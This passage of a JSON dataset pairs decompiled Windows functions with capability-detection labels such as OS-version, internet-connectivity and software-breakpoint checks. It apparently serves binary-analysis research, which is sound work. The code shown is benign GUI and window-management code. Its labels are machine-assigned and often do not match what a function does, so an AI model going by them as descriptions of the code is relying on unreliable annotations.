== 0x400) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x484398;\n            goto joined_r0x00474ca9;\n        }\n        dVar6 = *0x484398;\n        if (uVar11 == 0x800) {\n            dVar1 = *arg_ch;\n            goto joined_r0x00474ca9;\n        }\n        if (uVar11 == 0xc00) {\n            dVar1 = *arg_ch;\n            dVar2 = *0x484398;\n            goto joined_r0x00474ca9;\n        }\n    }\n    uVar11 = arg_8h & 0x1e;\ncode_r0x00474e67:\n    if (((arg_8h & 0x10) != 0) && ((arg_10h & 0x20) != 0)) {\n        fcn.0047047e(0x20);\n        uVar11 = uVar11 & 0xffffffef;\n    }\n    return uVar11 == 0;\n}\n",
        "token_count": 2035
    },
    "004014b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004014b0(uint32_t arg_8h, uint32_t arg_ch, uint *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *arg_14h_00;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint var_64h;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint var_54h;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint var_44h;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint lpwcx;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    arg_14h_00 = arg_10h;\n    uVar2 = arg_8h;\n    if ((((arg_8h != 0) && (arg_ch != 0)) && (arg_10h != NULL)) && (arg_14h != NULL)) {\n        if (*(arg_10h + 0x10) == 0) {\n            iVar1 = arg_ch + 4;\n            (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar1);\n            if (*(arg_14h_00 + 0x10) == 0) {\n                if (arg_14h_00[0xc] == 0) {\n                    if (arg_14h_00[0xf] == 0) {\n                        uVar5 = *(uVar2 + 8);\n                    }\n                    else {\n                        uVar5 = 0;\n                    }\n                    uVar5 = (*_sym.imp.USER32.dll_LoadCursorW)(uVar5, arg_14h_00[0xe]);\n                    arg_14h_00[7] = uVar5;\n                }\n                else {\n                    arg_8h = arg_14h_00[10];\n                    var_4h = arg_14h_00[2];\n                    lpwcx = 0x30;\n                    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoExW)(0, arg_14h_00[0xc], &lpwcx);\n                    if (iVar4 == 0) {\n                        iVar4 = (*_sym.imp.USER32.dll_GetClassInfoExW)(*(uVar2 + 4), arg_14h_00[0xc], &lpwcx);\n                        if (iVar4 == 0) {\n                            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n                            return 0;\n                        }\n                    }\n                    *arg_14h_00 = lpwcx;\n                    arg_14h_00[1] = uStack52;\n                    arg_14h_00[2] = uStack48;\n                    arg_14h_00[3] = uStack44;\n                    arg_14h_00[4] = var_24h;\n                    arg_14h_00[5] = uStack36;\n                    arg_14h_00[6] = uStack32;\n                    arg_14h_00[7] = uStack28;\n                    arg_14h_00[8] = var_14h;\n                    arg_14h_00[9] = uStack20;\n                    arg_14h_00[10] = uStack16;\n                    arg_14h_00[0xb] = uStack12;\n                    arg_14h_00[0xd] = arg_14h_00[2];\n                    arg_14h_00[10] = arg_8h;\n                    arg_14h_00[2] = var_4h;\n                }\n                uVar5 = *(uVar2 + 4);\n                arg_14h_00[1] = arg_14h_00[1] & 0xffffbfff;\n                iVar4 = arg_14h_00[10];\n                arg_14h_00[5] = uVar5;\n                if (iVar4 == 0) {\n                    iVar4 = arg_14h_00 + 0x42;\n                    fcn.0040f1b0(iVar4, 0x25, L\"ATL:%p\", arg_14h_00);\n                    arg_14h_00[10] = iVar4;\n                }\n                var_64h = *arg_14h_00;\n                uStack100 = arg_14h_00[1];\n                uStack96 = arg_14h_00[2];\n                uStack92 = arg_14h_00[3];\n                var_54h = arg_14h_00[4];\n                uStack84 = arg_14h_00[5];\n                uStack80 = arg_14h_00[6];\n                uStack76 = arg_14h_00[7];\n                var_44h = arg_14h_00[8];\n                uStack68 = arg_14h_00[9];\n                uStack64 = arg_14h_00[10];\n                uStack60 = arg_14h_00[0xb];\n                iVar3 = (*_sym.imp.USER32.dll_GetClassInfoExW)(arg_14h_00[5], iVar4, &var_64h);\n                *(arg_14h_00 + 0x10) = iVar3;\n                if (iVar3 == 0) {\n                    arg_8h = (*_sym.imp.USER32.dll_RegisterClassExW)(arg_14h_00);\n                    arg_8h = arg_8h & 0xffff;\n                    iVar3 = arg_8h;\n                    if (iVar3 != 0) {\n                        fcn.00402180(&arg_8h);\n                    }\n                    *(arg_14h_00 + 0x10) = iVar3;\n                }\n            }\n            arg_ch = (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n        }\n        if (arg_14h_00[0xc] != 0) {\n            arg_ch = arg_14h_00[0xd];\n            *arg_14h = arg_ch;\n        }\n        return arg_ch & 0xffff0000 | *(arg_14h_00 + 0x10);\n    }\n    return 0;\n}\n",
        "token_count": 1449
    },
    "004016a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004016a0(code **param_1)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint arg_8h;\n    int16_t *piVar5;\n    code *pcVar6;\n    uint32_t uVar7;\n    uint picce;\n    uint var_4h;\n    \n    pcVar6 = _sym.imp.USER32.dll_DefWindowProcW;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    param_1[7] = NULL;\n    param_1[8] = pcVar6;\n    param_1[9] = NULL;\n    param_1[10] = NULL;\n    param_1[0xb] = NULL;\n    param_1[0xc] = NULL;\n    cVar2 = fcn.00406560();\n    if (cVar2 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintInit)();\n    }\n    param_1[0xd] = NULL;\n    param_1[0xe] = 0x2;\n    *(param_1 + 0xf) = ZEXT816(0);\n    param_1[0xf] = 0x10;\n    param_1[0x13] = NULL;\n    fcn.00406690();\n    param_1[0x14] = NULL;\n    param_1[0x15] = NULL;\n    param_1[0x10] = 0x1;\n    if (param_1[0x14] != NULL) {\n        fcn.0042fb11(param_1[0x14]);\n        param_1[0x14] = NULL;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(L\"window\");\n    iVar1 = (iVar3 + 1U) * 2;\n    pcVar4 = fcn.0042fb08(-(iVar1 >> 0x20 != 0) | iVar1);\n    param_1[0x14] = pcVar4;\n    if (pcVar4 != NULL) {\n        arg_8h = fcn.0043be56(pcVar4, iVar3 + 1U, L\"window\");\n        fcn.00402c90(arg_8h);\n    }\n    *(param_1 + 0x16) = ZEXT816(0);\n    *(param_1 + 0x21) = 0;\n    uVar7 = 1;\n    *(param_1 + 0x86) = 0;\n    param_1[0x1c] = NULL;\n    piVar5 = 0x47be30;\n    param_1[0x1d] = NULL;\n    param_1[0x1e] = NULL;\n    param_1[0x20] = NULL;\n    param_1[0x1f] = 0x47be30;\n    do {\n        piVar5 = piVar5 + 2;\n        uVar7 = uVar7 + 1;\n    } while (*piVar5 != -1);\n    pcVar4 = fcn.0042fb08(-(uVar7 * 8 >> 0x20 != 0) | uVar7 * 8);\n    param_1[0x20] = pcVar4;\n    if (pcVar4 != NULL) {\n        fcn.00431db0(pcVar4, 0, uVar7 * 8);\n    }\n    *param_1 = vtable.CMainFrame.0;\n    param_1[0x1a] = vtable.CMainFrame.1.0;\n    param_1[0x1b] = vtable.CMainFrame.2.0;\n    param_1[0x23] = NULL;\n    param_1[0x27] = NULL;\n    param_1[0x28] = NULL;\n    param_1[0x29] = NULL;\n    param_1[0x2a] = pcVar6;\n    param_1[0x22] = vtable.CAeroView.0;\n    param_1[0x2c] = NULL;\n    param_1[0x2d] = NULL;\n    param_1[0x2e] = NULL;\n    param_1[0x2f] = NULL;\n    param_1[0x30] = NULL;\n    param_1[0x31] = NULL;\n    param_1[0x32] = NULL;\n    param_1[0x33] = NULL;\n    param_1[0x34] = 0x522;\n    if (*0x6cc7c0 == '\\0') {\n        iVar3 = *0x6cc6dc + 0x10;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar3);\n        if (*0x6cc7c0 == '\\0') {\n            picce = 8;\n            var_4h = 0x404;\n            (*_sym.imp.COMCTL32.dll_InitCommonControlsEx)(&picce);\n            *0x6cc7c0 = '\\x01';\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar3);\n        pcVar6 = _sym.imp.USER32.dll_DefWindowProcW;\n    }\n    *(param_1 + 0x132) = *(param_1 + 0x132) & 0xfe;\n    param_1[0x38] = NULL;\n    param_1[0x3d] = NULL;\n    param_1[0x3e] = NULL;\n    param_1[0x3f] = NULL;\n    param_1[0x40] = NULL;\n    param_1[0x42] = NULL;\n    param_1[0x46] = NULL;\n    param_1[0x47] = NULL;\n    param_1[0x48] = pcVar6;\n    param_1[0x49] = param_1 + 0x2b;\n    param_1[0x4a] = 0x1;\n    param_1[0x4b] = NULL;\n    param_1[0x54] = NULL;\n    param_1[0x58] = NULL;\n    param_1[0x59] = NULL;\n    param_1[0x5a] = NULL;\n    param_1[0x39] = NULL;\n    param_1[0x3a] = NULL;\n    param_1[0x3b] = pcVar6;\n    param_1[0x3c] = NULL;\n    param_1[0x41] = 0xb;\n    *(param_1 + 0x4c) = 0x884;\n    param_1[0x4d] = 0xffffffff;\n    param_1[0x4e] = 0xffffffff;\n    param_1[0x53] = 0xc0c0c0;\n    param_1[0x55] = NULL;\n    param_1[0x56] = NULL;\n    param_1[0x57] = NULL;\n    if (param_1[0x3d] != NULL) {\n        iVar3 = (*_sym.imp.COMCTL32.dll_ImageList_GetImageCount)(param_1[0x3d]);\n        if (iVar3 != 0) goto code_r0x00401a2c;\n        (*_sym.imp.COMCTL32.dll_ImageList_Destroy)(param_1[0x3d]);\n        param_1[0x3d] = NULL;\n    }\n    param_1[0x4f] = 0x10;\n    param_1[0x50] = 0xf;\n    param_1[0x51] = 0x16;\n    param_1[0x52] = 0x15;\ncode_r0x00401a2c:\n    param_1[0x2b] = vtable.WTL::CCommandBarCtrl.0;\n    param_1[0x5b] = NULL;\n    return param_1;\n}\n",
        "token_count": 1808
    },
    "00401dd0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401dd0(code **param_1)\n\n{\n    code **ppcVar1;\n    \n    ppcVar1 = param_1 + 4;\n    *param_1 = vtable.ATL::CRegObject.0;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(ppcVar1);\n    fcn.004033c0();\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(ppcVar1);\n    if (*(param_1 + 10) != '\\0') {\n        *(param_1 + 10) = 0;\n        (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(ppcVar1);\n    }\n    fcn.004033c0();\n    if (param_1[1] != NULL) {\n        fcn.0043bd54(param_1[1]);\n        param_1[1] = NULL;\n    }\n    if (param_1[2] != NULL) {\n        fcn.0043bd54(param_1[2]);\n        param_1[2] = NULL;\n    }\n    param_1[3] = NULL;\n    return;\n}\n",
        "token_count": 250
    },
    "00402470": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00402470(uint arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, int32_t arg_1ch, \n            int32_t arg_20h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint32_t var_70h;\n    int32_t var_64h;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_44h;\n    int32_t var_34h;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageW;\n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    iVar3 = (*_sym.imp.USER32.dll_SendMessageW)(arg_ch, 0x418, 0, 0);\n    cVar2 = fcn.004066f0(6, 0, 0);\n    if ((cVar2 == '\\0') || (cVar2 = fcn.004065c0(),  cVar2 == '\\0')) {\n        var_78h = 0x50;\n    }\n    else {\n        var_78h = 100;\n    }\n    fcn.00431db0(&var_74h, 0, 0x60);\n    var_74h = 0x371;\n    if (arg_14h != 0) {\n        var_74h = 0x375;\n    }\n    var_70h = 4;\n    if (0 < iVar3) {\n        var_70h = 0x204;\n    }\n    if (arg_18h != 0) {\n        var_70h = var_70h | 1;\n    }\n    var_64h = arg_14h;\n    var_58h = arg_ch;\n    if (arg_10h == 0) {\n        arg_10h = (*pcVar1)(arg_8h, 0x40c, 0, 0);\n        arg_10h = arg_10h + 0xeb00;\n    }\n    _lpRect = ZEXT816(0);\n    var_44h = arg_10h;\n    if (iVar3 < 1) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(arg_ch, &lpRect);\n        if (arg_1ch == 0) {\n            arg_1ch = var_ch - lpRect;\n        }\n        var_54h = 0;\n        if (arg_20h != 0) {\n            var_54h = arg_1ch;\n        }\n        var_50h = var_8h - var_10h;\n        var_4ch = arg_1ch;\n    }\n    else {\n        (*pcVar1)(arg_ch, 0x41d, iVar3 + -1, &lpRect);\n        if (arg_1ch != 0) {\n            var_ch = arg_1ch;\n        }\n        var_50h = var_8h - var_10h;\n        var_54h = var_ch;\n        var_4ch = var_ch;\n        if (arg_20h == 0) {\n            if (arg_14h == 0) {\n                (*pcVar1)(arg_ch, 0x41d, 0, &lpRect);\n                var_54h = var_ch;\n            }\n            else {\n                var_54h = 0;\n            }\n        }\n    }\n    arg_8h_00 = &var_78h;\n    var_34h = var_4ch;\n    iVar3 = (*pcVar1)(arg_8h, 0x40a, 0xffffffff);\n    if (iVar3 != 0) {\n        uVar4 = (*pcVar1)(arg_ch, 0x455, 0, 0);\n        uVar4 = uVar4 | 0x10;\n        (*pcVar1)(arg_ch, 0x454, 0);\n        fcn.004303e9(uVar4);\n        return;\n    }\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 1030
    },
    "00402d30": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402d30(uint arg_8h, uint hWnd, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint arg_8h_00;\n    uint hdc;\n    uint var_34h;\n    uint var_30h;\n    int32_t hbr;\n    uint dy;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t dx;\n    uchar var_15h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    uint nRightRect;\n    uint nBottomRect;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    hbr = arg_14h;\n    arg_8h_00 = hWnd;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowDC)();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        var_15h = 0;\n    }\n    else {\n        var_20h = (*_sym.imp.USER32.dll_GetSystemMetrics)(5);\n        iVar3 = (*pcVar1)(6);\n        iVar4 = (*_sym.imp.UxTheme.dll_GetThemeInt)(arg_8h, arg_18h, arg_1ch, 0x4b1, &var_20h);\n        if (-1 < iVar4) {\n            iVar3 = var_20h;\n        }\n        _nLeftRect = ZEXT816(0);\n        (*_sym.imp.USER32.dll_GetWindowRect)(hWnd, &nLeftRect);\n        dx = (*pcVar1)(0x2d);\n        iVar4 = (*pcVar1)(0x2e);\n        (*_sym.imp.USER32.dll_InflateRect)(&nLeftRect, -dx, -iVar4);\n        iVar5 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(&nLeftRect);\n        if (iVar5 == 0) {\n            var_15h = 0;\n        }\n        else {\n            if (arg_10h != 0) {\n                (*_sym.imp.GDI32.dll_CombineRgn)(iVar5, arg_10h, iVar5, 1);\n            }\n            pcVar1 = _sym.imp.USER32.dll_OffsetRect;\n            (*_sym.imp.USER32.dll_OffsetRect)(&nLeftRect, -nLeftRect, -nTopRect);\n            (*pcVar1)(&nLeftRect, dx, iVar4);\n            (*_sym.imp.GDI32.dll_ExcludeClipRect)(iVar2, nLeftRect, nTopRect, nRightRect, nBottomRect);\n            (*_sym.imp.USER32.dll_InflateRect)(&nLeftRect, dx, iVar4);\n            (*_sym.imp.UxTheme.dll_DrawThemeBackground)(arg_8h, iVar2, arg_18h, arg_1ch, &nLeftRect, 0);\n            if ((var_20h < dx) && (iVar3 < iVar4)) {\n                if (arg_14h == 0) {\n                    hbr = (*_sym.imp.USER32.dll_GetClassLongW)(hWnd, 0xfffffff6);\n                }\n                (*_sym.imp.USER32.dll_InflateRect)(&nLeftRect, var_20h - dx, iVar3 - iVar4);\n                (*_sym.imp.USER32.dll_FillRect)(iVar2, &nLeftRect, hbr);\n            }\n            (*_sym.imp.USER32.dll_DefWindowProcW)(hWnd, 0x85, iVar5, 0);\n            var_15h = 1;\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar5);\n        }\n    }\n    (*_sym.imp.USER32.dll_ReleaseDC)(hWnd, iVar2);\n    fcn.004303e9(arg_8h_00);\n    return;\n}\n",
        "token_count": 902
    },
    "00403200": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403200(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint in_stack_ffffff5c;\n    uint var_64h;\n    uint var_60h;\n    uint lpmi;\n    int32_t var_48h;\n    int32_t iStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t lpRect;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t lpPoints;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    uVar3 = (*_sym.imp.USER32.dll_GetWindowLongW)(*in_ECX, 0xfffffff0);\n    pcVar7 = _sym.imp.USER32.dll_GetWindowRect;\n    iVar5 = *in_ECX;\n    if (arg_8h == 0) {\n        if ((uVar3 & 0x40000000) == 0) {\n            arg_8h = (*_sym.imp.USER32.dll_GetWindow)(iVar5, 4);\n            pcVar7 = _sym.imp.USER32.dll_GetWindowRect;\n            (*_sym.imp.USER32.dll_GetWindowRect)(*in_ECX, &lpRect);\ncode_r0x00403342:\n            if (arg_8h == 0) {\ncode_r0x0040335d:\n                iVar5 = *in_ECX;\n            }\n            else {\n                uVar3 = (*_sym.imp.USER32.dll_GetWindowLongW)(arg_8h, 0xfffffff0);\n                iVar5 = arg_8h;\n                if ((uVar3 & 0x30000000) != 0x10000000) {\n                    arg_8h = 0;\n                    goto code_r0x0040335d;\n                }\n            }\n            iVar5 = (*_sym.imp.USER32.dll_MonitorFromWindow)(iVar5, 2);\n            if (iVar5 == 0) {\ncode_r0x004033a7:\n                fcn.004303e9(in_stack_ffffff5c);\n                return;\n            }\n            lpmi = 0x28;\n            iVar5 = (*_sym.imp.USER32.dll_GetMonitorInfoW)(iVar5, &lpmi);\n            if (iVar5 == 0) goto code_r0x004033a7;\n            var_34h = var_48h;\n            var_30h = iStack72;\n            var_2ch = iStack68;\n            var_28h = iStack64;\n            iVar5 = var_34h;\n            iVar6 = var_30h;\n            iVar1 = var_2ch;\n            iVar2 = var_28h;\n            if (arg_8h != 0) {\n                (*pcVar7)(arg_8h, &lpPoints);\n                iVar5 = lpPoints;\n                iVar6 = var_10h;\n                iVar1 = var_ch;\n                iVar2 = var_8h;\n            }\n            goto code_r0x00403280;\n        }\n        arg_8h = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n        (*_sym.imp.USER32.dll_GetWindowRect)(*in_ECX, &lpRect);\n    }\n    else {\n        (*_sym.imp.USER32.dll_GetWindowRect)(iVar5, &lpRect);\n        if ((uVar3 & 0x40000000) == 0) goto code_r0x00403342;\n    }\n    uVar4 = (*_sym.imp.USER32.dll_GetParent)(*in_ECX);\n    pcVar7 = _sym.imp.USER32.dll_GetClientRect;\n    (*_sym.imp.USER32.dll_GetClientRect)(uVar4, &var_34h);\n    (*pcVar7)(arg_8h, &lpPoints);\n    (*_sym.imp.USER32.dll_MapWindowPoints)(arg_8h, uVar4, &lpPoints, 2);\n    iVar5 = lpPoints;\n    iVar6 = var_10h;\n    iVar1 = var_ch;\n    iVar2 = var_8h;\ncode_r0x00403280:\n    var_8h = iVar2;\n    var_ch = iVar1;\n    var_10h = iVar6;\n    lpPoints = iVar5;\n    var_1ch = var_1ch - lpRect;\n    var_18h = var_18h - var_20h;\n    iVar6 = (var_ch + lpPoints) / 2 - var_1ch / 2;\n    iVar5 = (var_8h + var_10h) / 2 - var_18h / 2;\n    if (var_2ch < iVar6 + var_1ch) {\n        iVar6 = var_2ch - var_1ch;\n    }\n    if (iVar6 < var_34h) {\n        iVar6 = var_34h;\n    }\n    if (var_28h < iVar5 + var_18h) {\n        iVar5 = var_28h - var_18h;\n    }\n    if (iVar5 < var_30h) {\n        iVar5 = var_30h;\n    }\n    (*_sym.imp.USER32.dll_SetWindowPos)(*in_ECX, 0, iVar6, iVar5, 0xffffffff, 0xffffffff, 0x15);\n    fcn.004303e9(iVar5);\n    return;\n}\n",
        "token_count": 1307
    },
    "00403650": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403650(uint arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t arg_8h_00;\n    uint uVar5;\n    int32_t *piVar6;\n    int32_t in_ECX;\n    int32_t arg_8h_01;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint dwExStyle;\n    uint var_208h;\n    uint lpWindowName;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    fcn.00431db0(&lpWindowName, 0, 0x200);\n    (*_sym.imp.USER32.dll_LoadStringW)(*0x6cc7e4, *0x6c9e1c, &lpWindowName, 0x100);\n    iVar3 = (*_sym.imp.USER32.dll_LoadMenuW)(*0x6cc7e4, *0x6c9e1c & 0xffff);\n    arg_8h_01 = in_ECX + 0x20;\n    iVar2 = fcn.0040c0f0(arg_8h_01);\n    if (arg_10h == 0) {\n        arg_10h = 0x6cf0000;\n    }\n    if (arg_14h == 0) {\n        arg_14h = 0x40100;\n    }\n    piVar4 = 0x6c9c88;\n    if (arg_ch != NULL) {\n        piVar4 = arg_ch;\n    }\n    arg_8h_00 = *(in_ECX + 0x14);\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = fcn.0042f74e();\n        *(in_ECX + 0x14) = arg_8h_00;\n        if (arg_8h_00 == 0) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n            goto code_r0x0040382c;\n        }\n    }\n    fcn.0042f850(arg_8h_00, 0, 0);\n    if (iVar2 != 0) {\n        piVar6 = in_ECX + 8;\n        if ((piVar6 == NULL) || (in_ECX == 0)) {\n            fcn.0040eda0(0xc0000005, 1);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        *piVar6 = in_ECX;\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        *(in_ECX + 0xc) = uVar5;\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6c9c60);\n        *(in_ECX + 0x10) = *0x6c9c78;\n        *0x6c9c78 = piVar6;\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6c9c60);\n        if ((iVar3 == 0) && ((arg_10h & 0x40000000) != 0)) {\n            iVar3 = in_ECX;\n        }\n        piVar6 = 0x6c9c88;\n        if (piVar4 != NULL) {\n            piVar6 = piVar4;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                          (arg_14h, iVar2, &lpWindowName, arg_10h, *piVar6, piVar6[1], piVar6[2] - *piVar6, \n                           piVar6[3] - piVar6[1], arg_8h, iVar3, *0x6cc7e0, arg_18h);\n        if (iVar3 != 0) {\n            uVar5 = (*_sym.imp.USER32.dll_LoadAcceleratorsW)(*0x6cc7e4, *0x6c9e1c & 0xffff);\n            *(in_ECX + 0x30) = uVar5;\n        }\n    }\ncode_r0x0040382c:\n    fcn.004303e9(arg_8h_01);\n    return;\n}\n",
        "token_count": 1016
    },
    "00403850": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403850(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    _var_14h = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    if (arg_8h == 3) {\n        (*_sym.imp.USER32.dll_GetClassNameW)(arg_ch, &var_14h, 7);\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(0x47bf84, &var_14h);\n        if (iVar1 == 0) {\n            var_18h = arg_ch;\n            fcn.00402210(&var_18h);\n        }\n    }\n    else if (arg_8h == 4) {\n        (*_sym.imp.USER32.dll_GetClassNameW)(arg_ch, &var_14h, 7);\n        iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(0x47bf84, &var_14h);\n        if ((iVar1 == 0) && (iVar1 = *(*0x6cc7bc + 8) + -1,  -1 < iVar1)) {\n            fcn.0040cf70(iVar1);\n        }\n    }\n    (*_sym.imp.USER32.dll_CallNextHookEx)(*0x6cc7b8, arg_8h, arg_ch, arg_10h);\n    fcn.004303e9(arg_ch);\n    return;\n}\n",
        "token_count": 399
    },
    "00403920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403cd6)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00403920(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint *puVar5;\n    ushort uVar6;\n    int32_t iVar7;\n    uint uVar8;\n    uint *puVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint16_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint unaff_EDI;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint32_t var_280h;\n    uint32_t var_27ch;\n    int32_t var_278h;\n    int32_t var_274h;\n    uint32_t var_270h;\n    uint32_t var_26ch;\n    uint32_t var_268h;\n    uint *var_264h;\n    uint var_260h;\n    uint32_t lpvObject;\n    uint32_t var_4h;\n    \n    uVar14 = *0x6cc7e4;\n    pcVar1 = _sym.imp.KERNEL32.dll_FindResourceW;\n    var_4h = *0x6cade0 ^ &stack0xfffffffc;\n    var_270h = arg_ch;\n    var_268h = arg_18h;\n    var_27ch = *0x6cc7e4;\n    iVar7 = 